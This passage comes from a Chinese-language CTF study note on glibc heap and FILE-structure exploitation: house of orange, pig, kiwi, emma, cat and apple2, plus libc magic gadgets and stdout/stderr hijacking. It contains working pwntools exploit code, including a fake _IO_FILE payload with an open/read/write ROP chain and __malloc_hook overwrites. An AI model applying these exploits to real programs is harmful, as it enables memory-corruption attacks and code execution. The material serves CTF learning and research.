{
  struct _IO_FILE_complete file;
  const struct _IO_jump_t *vtable;
};
#endif
```

其实就是把IO\_FILE给包装起来，然后加入了vtable,64位偏移为0xd8,这个偏移其实就是结构体里面偏移，因为前面是结构体struct IO\_FILE

house系列
=======

**\_IO\_list\_all,\_IO\_2\_1*stderr*,stderr看情况写哪个**

**FROP打house of apple2,malloc\_assert打house of cat**

**题目没有sandbox就最好不打orw**

**注意FROP还有个条件要满足**

```text
1. _IO_list_all写入一个可控堆地址
2.  FAKE FILE+0x88(_IO_lock_t *_lock)的值=writable addr
3.  FAKE FILE+0xc0(fp->_mode)的值=0
4.  FAKE FILE+0x28的值>FAKE FILE+0x20的值（fp->_IO_write_ptr > fp->_IO_write_base）
```

- 调试断点

```text
b *&_IO_cleanup
b *&_IO_flush_all
b *&_IO_flush_all_lockp
b *&_IO_flush_all_lockp+223
b *&_IO_wfile_seekoff
b *&_IO_switch_to_wget_mode 
```

一个小技巧：有时候题目给的libc是没有符号表的，难以调试，可以从glibc-all-in-one中找到有符号表的同样版本的libc，这样有符号表，pwndbg更好有断点进行调试

**house系列的核心利用就是vtable是通过偏移调用函数**

house of orange
---------------

- 修改top chunk的size，然后add一个大于top chunk size的chunk让top chunk进入unsorted bin,**注意top chunk的inuse要为1，同时注意页对齐**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7e7956dd060397313df2f668cd2845071927133b.png)

- 利用unsorted bin attack往\_IO\_list\_all写入main\_arena+88或main\_arena+96，这个地址+0x68的位置（.chain）的值刚好是smallbin 0x60大小的堆块
- 因此修改刚才的unsorted bin chunk的size为0x61,然后add 一个比它大的chunk让这个chunk进入smallbin。
- 剩下的就是布置FAKE FILE打FSOP，**注意libc2.23的vtable检查不严格，因此可以布置为一个堆地址，然后这个堆地址+0x18为system就行了(\_IO\_OVERFLOW的位置)**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-80139e99604bbabe675e15b7293fb535a41b16ef.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b98a0c932520e4bc44f817e7cfb682493df19576.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3ca4e70b54e26c9b1d05fafa56f90671515c392d.png)

house of pig
------------

**必须要有exit函数会执行\_IO\_flush\_all\_lockp函数来遍历 FILE结构体，才能使用house of pig这条链**

- 注意malloc,memcpy,free三连参数设置的情况
- 利用\_IO\_str\_overflow的malloc,memcpy,free三连，设置FAKE\_FILE的值，使得free\_hook被覆盖为system函数，最后free就可以拿到shel
- 要让这个malloc正好得到的chunk是free\_hook才行

house of pig orw
----------------

**注意house of pig都需要libc2.34以下，要有hook打才行**  
**相比于house of pig,这个方法可以使用orw来绕过沙盒，同样需要有exit函数才行**

- IO\_str\_overflow中一个特别之处，mov rdx,QWORD PTR \[rdi+0x28\]这条汇编指令，此时的rdi恰好指向我们伪造的IO\_FILE\_plus的头部,使得可以进行rdx的设置，进而可以使用setcontent函数进行srop
- 具体细节不多阐述

house of kiwi
-------------

**无需exit()函数也可以进行!!!**  
条件：

1. 能够触发\_\_malloc\_assert,通常是堆溢出导致
2. 能够任意写,修改\_IO\_file\_sync和IO\_helper\_jumps + 0xA0 and 0xA8
3. assret中fflush(stderr)的函数调用,其中会调用\_IO\_file\_jumps中的sync指针 
    - fflush函数中调用到了一个指针位于\_IO\_file\_jumps中的\_IO\_file\_sync指针,且观察发现RDX寄存器的值为IO\_helper\_jumps指针,多次调试发现RDX始终是一个固定的地址
    - 如果存在一个任意写,通过修改 \_IO\_file\_jumps + 0x60的\_IO\_file\_sync指针为setcontext+61，修改IO\_helper\_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行orw

house of emma
-------------

使用方法:

1. 伪造\_IO\_cookie\_file
2. 绕过 PTR\_DEMANGLE,劫持pointer guard为一个堆地址

house of cat
------------

**house of cat在\_IO\_switch\_to\_wget\_mode可以设置rdx,随后调用setcontent+61可以直接进行orw，不用magic gadget**

**但是house of cat需要控制rcx不为0，在malloc\_assert的时候可以满足，dbg时发现FSOP不能满足，此时建议打apple2**

**house of cat在elf文件中stderr会先用elf文件中的而不是libc中的stderr**

**可以打IO\_2\_1\_stderr**

对应设置如下

1. \_lock = writable address,\_mode = 0
2. fake\_file+0xa0也就是wide\_data设置为一个堆地址
3. fp-&gt;\_wide\_data-&gt;\_IO\_write\_ptr &gt; fp-&gt;\_wide\_data-&gt;\_IO\_write\_base wide\_data+0x20&gt;wide\_data+0x18 rdx=\*(wide\_data+0x20)
4. wide\_data+0xe0设置为一个地址C，让该地址C+0x18为一个函数，一般为setcontext+61

house of apple2
---------------

**fp的vtable覆盖为\_IO\_wxxx\_jumps（加减偏移）,执行\_IO\_wfile\_overflow，绕过里面一个个函数调用链，最后根据偏移执行\_wide\_vtable里面的函数，利用magic gadget执行orw拿到flag**

**在打FSOP的时候打apple2最好**

**\_IO\_wfile\_overflow**

对fp的设置如下：

- \_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
- vtable设置为\_IO\_wfile\_jumps（加减偏移），使其能成功调用\_IO\_wfile\_overflow即可
- \_lock = writable address,\_mode = 0
- \_wide\_data设置为可控堆地址A，即满足\*(fp + 0xa0) = A
- \_wide\_data-&gt;\_IO\_write\_base设置为0，即满足\*(A + 0x18) = 0
- \_wide\_data-&gt;\_IO\_buf\_base设置为0，即满足\*(A + 0x30) = 0
- \_wide\_data-&gt;\_wide\_vtable设置为可控堆地址B，即满足\*(A + 0xe0) = B
- \_wide\_data-&gt;\_wide\_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足\*(B + 0x68) = C

函数的调用链如下:

```text
_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

magic\_gadgets
==============

libc2.36
--------

- 此时的rax正好指向FAKE\_IO头部

```text
.text:0000000000160E56                 mov     rdx, [rax+38h]
.text:0000000000160E5A                 mov     rdi, rax
.text:0000000000160E5D                 call    qword ptr [rdx+20h]
```

- 也就是svcudp\_reply+0x1a

```text
.text:00000000001630AA                 mov     rbp, [rdi+48h]
.text:00000000001630AE                 mov     rax, [rbp+18h]
.text:00000000001630B2                 lea     r13, [rbp+10h]
.text:00000000001630B6                 mov     dword ptr [rbp+10h], 0
.text:00000000001630BD                 mov     rdi, r13
.text:00000000001630C0                 call    qword ptr [rax+28h]

ROPgadget --binary libc.so.6  | grep 'mov rdi, r13'
0x00000000001587b3 : mov rdi, r13 ; call qword ptr [rax + 0x10]
0x000000000008975f : mov rdi, r13 ; call qword ptr [rax + 0x18]
0x000000000015760c : mov rdi, r13 ; call qword ptr [rax + 0x20]
0x00000000001630bd : mov rdi, r13 ; call qword ptr [rax + 0x28]
```

libc2.35(house of apple2)
-------------------------

[参考博客](https://blog.csdn.net/m0_63437215/article/details/127914567)  
libc2.35 3.6 0x16A06A  
libc2.35 3\_ 在上述偏移上下找就行  
gadget=licbase+0x16A1FA  
magic\_gadget = libc\_base + libc.sym\["svcudp\_reply"\] + 0x1a

```text
   0x7ffff7f092ba <svcudp_reply+26>    mov    rbp, qword ptr [rdi + 0x48]
   0x7ffff7f092be <svcudp_reply+30>    mov    rax, qword ptr [rbp + 0x18]
   0x7ffff7f092c2 <svcudp_reply+34>    lea    r13, [rbp + 0x10]
   0x7ffff7f092c6 <svcudp_reply+38>    mov    dword ptr [rbp + 0x10], 0     
   0x7ffff7f092cd <svcudp_reply+45>    mov    rdi, r13
   0x7ffff7f092d0 <svcudp_reply+48>    call   qword ptr [rax + 0x28]
```

- 具体做法

```python
fake_IO_addr =
magic_gadget = libc_base + libc.sym["svcudp_reply"] + 0x1a

leave_ret = libc_base + 0x0000000000052d72 #: leave ; ret
pop_rdi_ret = libc_base + 0x000000000002daa2 #: pop rdi ; ret
pop_rsi_ret = libc_base + 0x0000000000037c0a #: pop rsi ; ret
pop_rdx_r12_ret = libc_base + 0x00000000001066e1 #: pop rdx ; pop r12 ; ret
rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70

#read(0, (void *)ptr[num], 0xAA0uLL)直接向_IO_2_1_stderr_写入数据，同时伪造A,B,C三个fake file
orw_rop =  b'./flag\x00\x00'
orw_rop += p64(pop_rdx_r12_ret) + p64(0) + p64(fake_IO_addr - 0x10)
orw_rop += p64(pop_rdi_ret) + p64(rop_address)
orw_rop += p64(pop_rsi_ret) + p64(0)
orw_rop += p64(libc_base + libc.sym['open'])
orw_rop += p64(pop_rdi_ret) + p64(3)
orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)
orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
orw_rop += p64(libc_base + libc.sym['read'])
orw_rop += p64(pop_rdi_ret) + p64(1)
orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)
orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
orw_rop += p64(libc_base + libc.sym['write'])

payload = p64(0) + p64(leave_ret) + p64(1) + p64(2) #这样设置同时满足assert和fsop
payload = payload.ljust(0x38, b'\x00') + p64(rop_address) #FAKE FILE+0x48
payload = payload.ljust(0x90, b'\x00') + p64(fake_IO_addr + 0xe0) #_wide_data=fake_IO_addr + 0xe0
payload = payload.ljust(0xc8, b'\x00') + p64(libc_base + libc.sym['_IO_wfile_jumps']) #vtable=_IO_wfile_jumps
#*(A+0Xe0)=B   _wide_data->_wide_vtable=fake_IO_addr + 0xe0 + 0xe8
payload = payload.ljust(0xd0 + 0xe0, b'\x00') + p64(fake_IO_addr + 0xe0 + 0xe8)
#*(B+0X68)=C=magic_gadget
payload = payload.ljust(0xd0 + 0xe8 + 0x68, b'\x00') + p64(magic_gadget)
payload = payload + orw_rop
```

- 过程描述 
    1. rdi= A,rbp=rop\_addr
    2. rax=A-0x10
    3. call \[rax+0x28\]等价于call leave;ret
    4. leave：mov rsp,rbp; pop rbp 此时rsp=rop\_addr再ret执行rop

libc2.34(house of emma)
-----------------------

libc2.34,在libc2.35就没了这个gadget  
gadget\_addr = libc\_base + 0x146020 各个libc相差一般也不会太远，就在附近找就行  
可以设置rdx的值然后setcontent+61来进行orw

```text
mov rdx, qword ptr [rdi + 8]; 
mov qword ptr [rsp], rax; 
call qword ptr [rdx + 0x20];
```

libc2.31
--------

- libc2.31利用 getkeyserv\_handle+576

```text
mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]
```

其他
==

fastbin错位构造
-----------

- 通过错位构造\\x7f可以得到malloc\_hook

```python
edit(0x10,p64(libc.sym['__malloc_hook']-0x23))
add(0x68,b"A"*8)
add(0x68,b"\x00"*0x13 + p64(one_gadget))

```

realloc调整堆栈打ogg
---------------

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8d5b1f05bb744ccf88ad2851d896a1e05367a4a8.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3cd75b9bf70214ca844924e840530ec2bf332207.png)

- 注意realloc\_hook就在malloc\_hook-8的位置

```python
# __malloc_hook -> realloc+8
# __realloc_hook -> one_gadget
realloc = libc_base + libc.sym['realloc']
one_gadget = [0x4527a, 0xf03a4, 0xf1247]
add(4, 0x68, b'p' * 11 + p64(libc_base + one_gadget[0]) + p64(realloc + 8))
```

libc got
--------

[参考博客](https://bbs.kanxue.com/thread-276031.htm)

- 其实没什么特别的，现在主流的打法就是puts函数会调用libc中got.plt的strlen函数，而strlen的got表可以被我们修改，所以strlen(buf)就有点像hook一样可以打
- 最好用ida查看偏移
- 这个方法目前还没打过，感觉还是IO是主流打法，一般是无法进行largebin attack只能打fastbin attack和tcache attack才用此方法

stderr
------

- 在打IO攻击的时候经常需要用到malloc\_assert，要打stderr,这里区分一下几个概念

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-cde1953bf394dcb7ca934a3dd01173bc68364d24.png)

1. 直接打\_IO\_2\_1*stderr*  
    如果可以任意地址写，可以直接将\_IO\_2\_1\_stderr\_修改，将其vtable修改为IO\_xxx\_jumps，但是一般不会有这么理想的情况
2. 修改stderr的指向

- elf文件中bss段上的stderr

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-bbf9316402e255f80545ab38d18da576cda2255a.png)

- libc中got表中的stderr

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-352f0933344f032bfa95e34f1215e5d4b6c1aca3.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-049102d8fb5777259a4e607abeced8eeb2e0f07c.png)

- libc中.data位置的stderr

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-57d042a5c408235dbfb7cdc30173f365fa755214.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-60802b0613aa1858fe21e5d5d5b23989aa05511e.png)

**可以看到很多地方都存的有\_IO\_2\_1*stderr*,但是IO攻击中实际要修改的是elf文件的bss段的stderr，如果elf文件的bss段没有stderr，此时修改libc的.data区域才有用**

- 参考内容如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-08ab1524590a4e1eb2419956107e607884d03906.png)

stdout
------

**遇到puts或printf，就会将\_IO\_write\_base指向的内容打印出来。实际操作中发现如果是write函数还不行**

- stdout原理[这篇文章非常详细](https://blog.csdn.net/qq_41202237/article/details/113845320)
- stdout例题[具体可见这篇文章](https://zikh26.github.io/posts/a9dd00f0.html)

**这里给出爆破的模板**

```python
while True:
        try:
            p=process(file)
            exp()
            break
        except:
            p.close()
            continue
```

覆盖一字节泄露libcbase

- add(0x40,p64(0xfbad1887)+p64(0)\*3+b'\\x00')
- 图示，**直接gdb.attach到这个位置查看泄露出来的是什么然后手动算偏移**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f6bf4d05beb54d733a2931d00021c907f44e1d3f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6d9d6461ecd5e0f4a0037d2e364dfe6c482b0a9f.png)